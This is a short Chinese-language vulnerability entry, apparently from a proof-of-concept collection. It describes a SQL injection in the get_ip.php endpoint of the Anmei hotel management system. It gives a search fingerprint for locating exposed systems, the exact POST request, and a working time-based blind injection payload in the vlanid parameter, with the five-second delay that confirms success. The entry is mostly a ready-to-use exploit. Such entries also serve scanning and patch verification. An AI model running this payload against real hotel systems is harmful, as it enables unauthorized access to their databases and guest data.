# 安美酒店管理系统get_ip存在sql注入漏洞

安美酒店管理系统 ｜ SQL注入 ｜ —
- **指纹**：`title="酒店宽带运营系统"`
- **请求**：`POST /user/get_ip.php HTTP/1.1`

**Payload**
```
lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z
```
- **响应特征**：200 响应时间>=5s